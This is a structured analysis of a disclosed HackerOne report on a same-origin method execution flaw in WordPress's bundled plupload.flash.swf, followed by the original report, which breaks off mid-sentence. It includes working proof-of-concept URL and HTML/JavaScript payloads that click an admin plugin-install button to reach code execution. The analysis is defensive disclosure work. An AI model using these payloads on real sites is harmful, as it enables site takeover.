# WordPress SOME/XSS vulnerability in plupload.flash.swf leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 134738 | https://hackerone.com/reports/134738
- **Submitted:** 2016-04-26
- **Reporter:** cure53
- **Program:** WordPress
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Same-Origin Method Execution (SOME), Cross-Site Scripting (XSS), URL Sanitization Bypass, Flash ExternalInterface Abuse
- **CVEs:** None
- **Category:** memory-binary

## Summary
WordPress bundles a vulnerable version of plupload.flash.swf that fails to properly sanitize GET parameters when filtering flashVars, allowing attackers to bypass the 'GET Killer' protective mechanism. By crafting malicious URLs with unescaped query parameters, attackers can invoke arbitrary JavaScript functions through Flash's ExternalInterface, leading to Remote Code Execution through reverse clickjacking and plugin installation manipulation.

## Attack scenario
1. Attacker crafts a malicious URL with specially formatted query parameters that include dots (.) in the uid parameter, bypassing the trim() and key matching logic
2. Victim clicks on the crafted link or visits an attacker-controlled page that opens the vulnerable SWF with the malicious parameters
3. The SWF's parseStr() function fails to properly handle the malicious input due to improper escaping, storing the parameter values
4. When _fireEvent() is called, it invokes ExternalInterface.call() with the attacker-controlled event dispatcher and uid values
5. The JavaScript function specified in the 'target' parameter is executed with the attacker's context, allowing arbitrary code execution
6. Attacker chains this with WordPress admin plugin installation to achieve complete RCE on the WordPress installation

## Root cause
The vulnerability stems from an incomplete implementation of the 'GET Killer' sanitization mechanism. While the code attempts to remove flashVars that match GET parameters, the parsing logic in Utils.parseStr() combined with insufficiently strict regex validation (allowing dots in uid parameter) allows the check to be bypassed. The regex /^[\w\.]+$/ for the target parameter permits dots, which when combined with weak URL encoding handling, allows attackers to reference nested JavaScript objects or bypass the parameter filtering entirely.

## Attacker mindset
An attacker recognizes that client-side Flash security controls can be circumvented through careful parameter manipulation and URL encoding tricks. Rather than attacking the sanitization directly, the attacker exploits the gap between how the URL parser handles encoded characters and how the SWF application interprets parameters. By chaining SOME attacks with WordPress admin functionality, the attacker escalates from XSS to full RCE, demonstrating how legacy Flash components in modern applications introduce critical security risks.

## Defensive takeaways
- Remove or replace legacy Flash components entirely; Flash reached end-of-life and introduces inherent security risks that cannot be fully mitigated
- Implement strict content security policies (CSP) to prevent Flash from executing JavaScript even if XSS vulnerabilities exist
- If Flash must be used, employ whitelist-based validation for all URL parameters with strict regex patterns that exclude special characters like dots when unnecessary
- Properly escape and validate all data passed to ExternalInterface.call(), treating external data as untrusted
- Conduct thorough security audits of bundled third-party components and their versions
- Implement defense-in-depth: even if SWF sanitization fails, restrict plugin installation to authenticated requests with CSRF tokens
- Regularly update and audit dependencies from upstream projects like Moxie/Plupload

## Variant hunting
Search for: (1) other Flash files bundled in WordPress or plugins that use ExternalInterface.call() with user-controlled parameters; (2) similar 'GET Killer' implementations in other Flash libraries that may have inadequate parameter filtering; (3) Flash files that call JavaScript functions stored in URL parameters without sufficient validation; (4) other instances where URL parameter parsing differs between Flash and JavaScript interpretations; (5) SWF files in older WordPress plugin versions that may use similar Plupload versions

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (Flash vulnerability in WordPress)
- T1071 - Application Layer Protocol (JavaScript/ExternalInterface communication)
- T1566.002 - Phishing: Spearphishing Link (malicious SWF URL)
- T1547.015 - Boot or Logon Initialization Scripts (plugin installation via WordPress admin)
- T1005 - Data from Local System (accessing DOM elements via JavaScript)

## Notes
This vulnerability represents a critical intersection of legacy technology (Flash), weak URL sanitization, and powerful WordPress admin functionality. The 'GET Killer' was designed to prevent parameter injection but had a fundamental flaw in its implementation. The vulnerability required coordination between multiple security researchers (Heiderich, Kinugawa, Inführ) to fully understand the attack chain. The PoC demonstrates the importance of considering how URL encoding, parameter parsing, and platform-specific behaviors interact. Similar vulnerabilities may exist in other WordPress versions and plugins using older Plupload versions.

## Full report
<details><summary>Expand</summary>

Intro
==

WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file *plupload.flash.swf*. The code in the file attempts to remove *flashVars* [¹](https://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html) in case they have been set GET parameters but fails to do so, enabling XSS via *ExternalInterface* [²](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html).

The attack technique was first described by Soroush Dalili in 2013 [³](https://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-bypassing-the-guardians-part-1/). The vulnerability in *plupload.flash.swf* was discovered in April 2016, first identified as SOME[⁴](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html) bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.

**Simple PoC:**
http://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=hello&

A more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.

```html
<button onclick="fire()">Click</button>
<script>
function fire() {
 open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
  setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
}
</script>
```

Background
==

The majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:

https://hackerone.com/bugs?subject=user&report_id=134546

This section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.

Similar to the affected file in the linked report, Plupload employs the so called “GET Killer”:

```actionscript
params = root.loaderInfo.parameters;
pos = root.loaderInfo.url.indexOf('?');
if (pos !== -1) {
    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        
    
    for (var key:String in params) {    
        if (query.hasOwnProperty(Utils.trim(key))) {
            delete params[key];
        }
    }
}
```

From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70

The string parsing is done in a different ActionScript file:

```actionscript
static public function parseStr (str:String) : Object {
    var hash:Object = {},
        arr1:Array, arr2:Array;
    
    str = unescape(str).replace(/\+/g, " ");
    
    arr1 = str.split('&');
    if (!arr1.length) {
        return {};
    }
    
    for (var i:uint = 0, length:uint = arr1.length; i < length; i++) {
        arr2 = arr1[i].split('=');
        if (!arr2.length) {
            continue;
        }
        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);
    }
    return hash;
}
```

From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102

The sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.

The affected code can be found here:

```actionscript
private function _fireEvent(evt:*, obj:* = null):void {
    try {
        ExternalInterface.call(eventDispatcher, evt, obj);
    } catch(err:*) {
        //_fireEvent("Exception", { name: 'RuntimeError', message: 4 });
        
        // throwing an exception would be better here
    }
}
```

The method is being called from within the `_init()` method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.

**Calling _fireEvent:**
```actionscript
Moxie.uid = Utils.sanitize(params["uid"]);    

[...]

_fireEvent(Moxie.uid + "::Init");    
```


**Setting the event dispatcher:**
```actionscript
// Event dispatcher
if (params.hasOwnProperty("target") && /^[\w\.]+$/.test(params["target"])) {
    eventDispatcher = params["target"];
}
```

The sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:

```actionscript
if (params.hasOwnProperty("target") && /^[\w\.]+$/.test(params["target"])) {

```

```actionscript
static public function sanitize(str:String) : String
{
    // allow only [a-zA-Z0-9_]
    return str.replace(/[^\w]/g, '');
}
[...]
Moxie.uid = Utils.sanitize(params["uid"]);

```

Despite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.

An attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a `click()` method. Let’s have a look at a trivial example first and imagine *victim.com* that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:

* Attacker crafts a specific payload
* Attacker then lures logged in victim to a website 
* The website will do the following steps 
* Open the Plupload SWF in a new tab
* Have the SWF use the target parameter `opener.document.body.firstElementChild.firstElementChild.click`
* While the SWF still loads, the `opener` location changes
* It navigates to *victim.com/admin*
* Now, SWF and page are on the same domain
* SWF is now allows to perform clicks on opener. The button will be clicked

Done, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.

Now, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!

1. An attacker sends a link that contains the exploit to an authenticated user
2. The user (victim) opens the link and clicks the button
3. The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page
5. The exploit then triggers the install button of a malicious plugin
6. The plugin is installed and the malicious codes are uploaded on the server accordingly

```html
<button onclick="fire()">Click</button>
<script>
function fire() {
 open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
  setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
}
</script>
```

Affected Systems
==

All WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more[⁹](https://www.google.com/search?q=inurl:/wp-includes/js/plupload/plupload.flash.swf+ext:swf&channel=fs&start=10).

Here is some numbers that oth

</details>

---
*Analysed by Claude on 2026-05-11*
